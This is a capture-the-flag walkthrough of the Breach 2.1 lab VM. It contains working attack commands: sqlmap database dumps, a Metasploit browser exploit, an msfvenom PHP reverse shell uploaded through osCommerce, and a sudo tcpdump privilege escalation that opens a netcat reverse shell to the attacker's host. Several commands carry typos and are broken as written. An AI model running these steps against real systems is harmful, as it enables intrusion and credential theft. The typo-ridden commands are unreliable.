@@ -1,0 +1,133 @@
+
+Hack the Breach 2.1 VM (CTF Challenge)
+
+Breach 2.1 is the second VM in the multi-series Boot2Root CTF challenges. This is developed by mrb3n. It is high-level challenge and shows a lot of scenario including plenty of twists and trolls along the way. It works on a static IP i.e 192.168.110.151 therefore we have configured our adapter to be a host-only adapter.
+You can download it from: https://www.vulnhub.com/entry/breach-21,159/
+WalkThrough
+As our VM is hosted on static IP, there is no need to discover our target we will directly start by scanning our target.
+nmap –p- -A 192.168.110.151
+
+Nmap shows us that only three ports are open which are: 111, 52263, 65535 with the services of rpbind, status, SSH respectively. Let’s check SSH port.
+ssh 192.168.110.151 –p 65535
+Here,
+-p = a specified port
+
+Let’s assume here that password is “inthesource” because in the area between the hashes it says “Peter, if that’s you – the passowrd is in the source”. that means peter is the username and the pass word is inthesource. I gave it a try.
+ssh peter@192.168.110.151 –p 65535
+It logged in but i couldn’t find anything. So I just gave nmap another try and there was port 80 open this time.
+nmap -p- -A 192.168.110.151
+
+As the port 80 just opened, to our luck we can open this in our browser now.
+
+Now on the webpage it says “Welcome to Initech Cyber consulting. LLC” and something about BEEF. Even in the page source I found nothing so I decided to use DirBuster. It showed me a lot of directories but the one that stole my interest was /blog/.
+
+So I opened it in the browser. It opened a travel blog. There was a search box on the blog so I tried SQL injection by using single inverted comma (‘).
+
+This way I found SQL vulnerability so I used SQLMap next.
+Sqlmap –u http://192.168.110.151/blog/index.php?search  –dbs
+
+This command will start the process and it will show you five table names in database.
+
+Out of these five oscommerce is the most famous CMS of e-commerce websites. And this blog was also related to commerce. So I decided to use my next SQLMap command against this table in databse.
+Sql –u http://192.168.110.151/blog/index.php?search= –dbs –D oscommerce –tables –dump
+
+Execution of this command will give you username and password. The username is admin but the password that you will receive will be MD5 hash value.
+
+You can crack this MD5 hash value using any third party or you can use an online method like I did.
+
+Upon cracking the password you will get here is 32admin. Now I have usernames and password but I do not have a log in portal. So I started exploring the blog but couldn’t find anything. So cooped and pasted it copyright information on google.
+
+And upon search the goggle I found the first link of exploit-db.com that means there is an exploit for the said. And that’s why I opened the linked and explored it.
+
+In the exploit there was information about XSS code and a link was provided. Now I know that BEEF does XSS work and on the very first webpage too there was something about BEEF. So naturally I started working with BEEF.
+
+Now BEEF automatically gives us a script which includes a link. I copied that link and opened the BEEF panel in the browser.
+
+Here, go to register option and paste the copied link in the username area and give and random password and email.
+
+As you can see BEEF will give you a session.
+
+From the entire cross sitting details BEEF have to show please pay close attention to the browser. You will find that our target is using FireFox 15.0 and fortunately there is an exploit for this in metasploit.
+
+Now, open metasploit and type the following command to use the said expoit :
+use exploit/multi/browser/firefox-proto_crmfrequest
+set paypload generic/shell_reverse_tcp
+set srvhost 192.168.110.128
+set uripath shell
+set lhost 192.168.110.128
+exploit
+
+Performing this exploit will give you and URL like in my case URL is http://192.168.100.128:4444:8080/shell. Copy this link and go to the BEEF panel. In the BEEF panel go to the Commands tab > Hooked Domain > Redirect Browser. Paste the copied link here in the Redirect URL text box.
+
+As you follow the above steps you will have a shell session.
+
+Now here is trick, you will lose the session as you as you will get it. Here you will have to transfer you shell session to meterpreter session within 5 seconds and for that type :
+use post/multi/manage/shell_to_meterpreter
+set session 1
+run
+
+And you will have a session. Open that session and you will reach the terminal. In the terminal lets check out the home folder.
+cd /home
+ls
+In the home folder you will three folders i.e. bill, milton, peter. It was not of much use so went ahead and and checked network status.
+netstat -tln
+
+Checking the network status gave me some co-ordinates. So I checked them on Google map and found that it was the co-ordinates of Houston. Now this Houston word can be a password or username so I just made a mental note of it for later use.
+
+Except this I found nothing so used Telnet to just get a reply and for that u sed the following comand :
+telnet 127.0.0.1 2323
+
+This time it replied with a question i.e. whose stapler is it? Now I don’t know the answer so I just pressed enter. So to know the answer I wanted to search Milton user. And for this, commands are:
+find /usr –user milton
+cat /usr/local/bin/cd.py
+ 
+Now in the python file it showed me the programming and as you can see in the image you the coding shows that correct answer “mine”. 
+So, I repeated my steps to reach the same question. And gave the answer as mine.
+
+Then I checked status of network and observed that port 8888 opened.
+
+I checked this port in browser and found two directories.
+
+Out of these I opened oscommerce link and the following page opened.
+
+I had the username and password for this CMS so I Google its admin page and logged in with the admin as username and admin as password.
+Note: we have cracked the MD5 value of password that resulted in 32admin but here is is no use of 32. The password is admin.
+
+It logged in but to upload the malicious code you have to follow the path is: file manage > includes > work.  Here you have to upload your php code.
+
+To generate the code go to the terminal in Kali and type:
+Msfvenom –p php/meterpreter/reverse-tcp lhost-192.168.110.128 lport=8443 –f raw
+
+Copy <? to die(); and save it in a .php document.
+
+Before running the file goes to mestaspoit and start multi/handler.
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.110.128
+set lport 8443
+exploit
+It will give you the meterpreter session and then type the combination of following commands to reach terminal :
+shell 
+id
+Next type :
+/var/www/html2/oscommerce/includes/work
+
+Still we haven’t reached root but we found blumbergh, let’s see what privileges it has.
+sudo –l
+Ok. So it saya that it can rum a tcpdump file as root. That’s interesting. To manipulate tcpdump I need to run a set of following comands:
+Echo $’id\n/bin/netcat 192.168.110.128 443 –e /bin/bash’ > /tmp/.test
+Chmod +x /tmp/.test
+Sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root
+
+Tough part is over! Now I just need to run netcat :
+nc –nlvp 443
+Let’s confirm if we have reached root or not and if yes, let’s see what it has to offer :
+id
+cd /root
+ls
+
+There ia flag.py file in /root. So no waiting. Lets capture the flag.
+python .flag.py
+
+HURRAYYYY!!!! The flag has been captured!!! Enjoy!
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here.
